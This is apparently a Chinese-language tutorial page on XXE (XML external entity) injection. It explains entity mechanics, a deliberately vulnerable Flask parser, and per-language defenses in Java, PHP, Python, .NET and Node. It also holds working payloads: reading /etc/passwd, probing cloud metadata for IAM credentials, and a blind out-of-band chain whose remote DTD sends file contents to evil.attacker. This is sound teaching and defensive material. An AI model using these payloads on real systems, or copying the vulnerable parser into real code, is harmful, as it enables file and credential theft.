---
order: 240
title: XXE 攻击
module: 'cybersecurity'
category: 云与基础设施
difficulty: intermediate
description: XXE（XML 外部实体注入）：实体机制原理、文件读取与 SSRF 利用链、盲注带外技巧与逐语言防御。
author: fanquanpp
updated: '2026-09-12'
related:
  - 'cybersecurity/230-SSRFAttack'
  - 'cybersecurity/160-OWASPTop10Detailed'
  - 'cybersecurity/260-DeserializationVulnerability'
  - 'cybersecurity/200-XSSDefense'
prerequisites:
  - 'cybersecurity/010-SecurityBasicsDefense'
---

## 1. 从 XML 实体说起

### 1.1 XML 与 DTD 的最小回顾

XML 允许在文档类型定义（DTD）里声明**实体（Entity）**——可以理解为「变量」：

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY company "FANDEX">          <!-- 内部实体：一个可复用的常量 -->
]>
<note>
  <org>&company;</org>                <!-- 引用实体，解析时被替换为 FANDEX -->
</note>
```

问题出在另一种实体——**外部实体**。DTD 允许实体指向一个 URI，解析器会去读取它：

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

如果解析器允许加载外部实体，且把解析结果回显到响应里，那么攻击者提交的 XML
就能让服务器**自己把本地文件读出来**——这就是 XXE（XML eXternal Entity injection）。
它属于 OWASP Top 10 2021 的 A05（配置错误）与 A08 范畴，当前对应 CWE-611。

> 类比：XML 解析器像一个收到「取货单」的仓库管理员。合法单据只让他分拣已有货物，
> 但 XXE 单据里夹了一句「顺路去档案室把 3 号柜的文件复印一份附在回执里」——
> 管理员照做了，复印件就随回执交到了攻击者手里。

### 1.2 一个最小的可复现示例

以下 Python 服务端代码存在回显型 XXE（仅用于实验环境演示）：

```python
from flask import Flask, request
import defusedxml.ElementTree as ET   # 先按不安全写法演示，稍后换回安全库

app = Flask(__name__)

@app.route("/parse", methods=["POST"])
def parse():
    raw = request.data
    # 危险写法：标准库解析外部实体并回显结果
    import xml.etree.ElementTree as StdET
    root = StdET.fromstring(raw)      # DTD 中的外部实体在这里被展开
    return {"org": root.findtext("org")}

@app.route("/parse-safe", methods=["POST"])
def parse_safe():
    # 安全写法：defusedxml 默认禁止外部实体与 DTD
    root = ET.fromstring(request.data)
    return {"org": root.findtext("org")}
```

攻击请求与预期响应：

```bash
curl -s -X POST http://127.0.0.1:5000/parse \
  -H 'Content-Type: application/xml' \
  --data-binary $'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r><org>&xxe;</org></r>'
# 响应中 org 字段即 /etc/passwd 内容（不安全路由）
```

## 2. 攻击面与利用方式

### 2.1 入口在哪里

任何「服务器解析 XML」的点都可能是入口，常见但容易被忽视：

- SOAP 1.1 接口、XML-RPC（如 WordPress 的 `xmlrpc.php`）；
- 文件上传：**DOCX/XLSX/SVG 本质是 XML**，服务端解析元数据或预览时触发；
- SSO 场景的 SAML 断言、企业间 EDI 报文、RSS 订阅抓取。

### 2.2 文件读取（回显型）

利用条件：解析结果出现在响应或错误信息中。除 `file://` 外，Windows 目标常用：

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
```

PHP 场景若启用了封装协议，可用 base64 过滤器读取含特殊字符的文件而不破坏 XML 结构：

```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
```

### 2.3 SSRF（探内网）

把外部实体指向内网地址即可让服务器发起探测请求，是云环境最危险的用法：

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!-- AWS/GCP 等云元数据服务，命中即可读取实例 IAM 临时凭证 -->
<!ENTITY xxe SYSTEM "http://192.168.1.10:6379/">   <!-- 内网服务指纹探测 -->
```

详细内网利用链见 011-SSRFAttack；此处强调：XXE 是 SSRF 的一种**协议级入口**，
两者防御要叠加（禁 DTD + 出网管控）。

### 2.4 盲注 XXE（Blind/OOB）

若响应不回显，可用**带外（OOB）通道**：让目标向攻击者控制的服务器发请求，通过
DNS/HTTP 日志确认漏洞并外带数据。外带文件内容需要绕过「实体内不能直接嵌换行/特殊字符」
的限制——经典手法是参数实体 + 远程 DTD：

```xml
<!-- 提交的请求体 -->
<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "http://evil.attacker:8000/evil.dtd">
<r>&send;</r>
```

```xml
<!-- 攻击者服务器上的 evil.dtd：先定义参数实体，再拼装请求 -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://evil.attacker:8000/?leak=%file;'>">
%wrapper;
```

```bash
# 攻击机上起一个可记录请求的 HTTP 服务，等待目标回连
python3 -m http.server 8000
# 日志中出现 GET /?leak=my-host-01 即证明盲 XXE 成立并拿到数据
```

### 2.5 拒绝服务：Billion Laughs

实体嵌套指数膨胀，可耗尽内存（属于 XML 炸弹，与外部实体同根）：

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!-- ...嵌套 9 层，最终展开数十亿个 "lol" -->
]>
```

主流解析器限制实体展开深度/个数即可缓解，但这也说明：**允许 DTD 本身就有风险**。

## 3. 逐语言防御配置

XXE 的防御核心只有一条：**禁用 DTD / 外部实体**。它是一行配置的事，
问题在于每一门语言、每一个解析库的开关都不一样。以下为官方推荐写法：

### 3.1 Java（历史上 XXE 重灾区，尤其旧版 Xerces）

```java
// DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // 最彻底
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// SAXParserFactory / XMLInputFactory（StAX）同理：
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

### 3.2 PHP

```php
// PHP 8.0 起外部实体默认已禁用；旧版本需显式设置
libxml_disable_entity_loader(true);   // 仅 PHP < 8.0 有效（8.0 起已废弃）
// 不要传 LIBXML_NOENT 标志——它会启用实体替换，方向恰好相反
// 额外兜底：直接拒绝含 DTD 的输入
if (str_contains($data, '<!DOCTYPE')) {
    throw new InvalidArgumentException('DTD not allowed');
}
```

### 3.3 Python / .NET / Node.js

```python
# Python：用 defusedxml 包装（或替代）标准库
from defusedxml import ElementTree as SafeET
root = SafeET.fromstring(untrusted_xml)   # 默认禁止实体与 DTD
```

```csharp
// .NET Framework 4.5.2+ / .NET Core 默认安全；旧版本需显式：
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
```

```javascript
// Node.js：libxmljs 显式关闭；express 的 body-parser xml 扩展需检查配置
const parser = new libxmljs.SaxParser();
parser.processingInstructions(false);   // 不处理指令
parser.dtdHandling(false);              // 不处理 DTD
```

### 3.4 分层防御汇总

```text
第一层（根治）：禁用 DTD / 外部实体 —— 上面各语言开关
第二层（收敛）：XML Schema 校验 + 输入不含 "<!DOCTYPE" 快速拒绝
第三层（兜底）：出网代理与内网分段，使解析服务无法访问敏感内网地址
```

## 4. 检测与测试

### 4.1 手动测试步骤

```text
1. 识别 XML 入口      ：抓包看 Content-Type 与报文结构（含 SOAP/SAML/上传文件）
2. 回显探针           ：<!ENTITY xxe SYSTEM "file:///etc/hostname"> 引用到会回显的元素
3. 带外探针           ：DOCTYPE 指向自己的 http://evil.attacker:8000/xxx，看回连日志
4. 协议扩展           ：file→http→ftp→(PHP)php://filter，逐步扩展读取能力
5. 提权评估           ：能否读到配置文件（数据库密码）、云元数据（IAM 凭证）
```

### 4.2 自动化工具

| 工具                | 用法                                            |
| :------------------ | :---------------------------------------------- |
| Burp Suite + Collaborator | 盲 XXE 回连检测的首选                     |
| xxeserv / http.server     | 自建 OOB 接收端                           |
| Nuclei / Nikto            | 模板化 XXE 探测（见 034-VulnerabilityScanTools） |

## 5. 完整实战场景

**场景**：某企业内部「报表上传」功能接受 `.xlsx`（OOXML，内部是 XML 集合）。
渗透测试中，将工作簿内的 `xl/sharedStrings.xml` 注入 DTD 与实体，实体指向
`http://169.254.169.254/latest/meta-data/iam/security-credentials/`；
解析器在预览生成时展开实体，向元数据服务发请求；攻击者通过带外 DNS 子域名回连
确认请求发出，最终该服务所在子网未做出网限制，确认可触达元数据服务。

**结论与修复**：上传解析服务使用 defusedxml/等价安全开关；解析服务放入独立网络分区，
出网走代理白名单；云主机启用 IMDSv2 并最小化实例角色权限。
这是一个「应用层补丁 + 网络层收敛 + 平台层加固」三层叠加的典型 XXE 修复案例。

## 6. 常见陷阱与调试

| 陷阱                                 | 说明与对策                                         |
| :----------------------------------- | :------------------------------------------------- |
| 只测回显就下结论「无漏洞」           | 不回显仍可能有盲 XXE，必须做带外测试               |
| 忘记非 API 入口                      | DOCX/SVG/SAML 都是 XML，上传与 SSO 也要测          |
| 用 `LIBXML_NOENT` 以为更安全         | 该标志恰恰**启用**实体替换，方向反了               |
| 只在代码层修复，不做网络收敛         | 解析器更新遗漏或新语言栈出现时，出网限制是最后防线 |
| 渗透时读取 `/etc/passwd` 就收工      | 应继续读 `/proc/self/environ`、应用配置等高价值文件 |

## 小结

- **初学者要点**：XXE = 让 XML 解析器去加载外部实体。三类后果：读文件、打内网（SSRF）、
  拒绝服务。防御一句话——禁用 DTD；各语言开关不同但都必须落在「不可信 XML」的解析点上。
- **进阶注意**：盲 XXE 用参数实体 + 远程 DTD 外带数据，务必用带外测试确认；DOCX/SVG 等复合
  文档是隐蔽入口；修复必须三层叠加（禁 DTD、Schema 校验、出网管控），云环境同时启用
  IMDSv2 以防元数据凭证被一键带走。
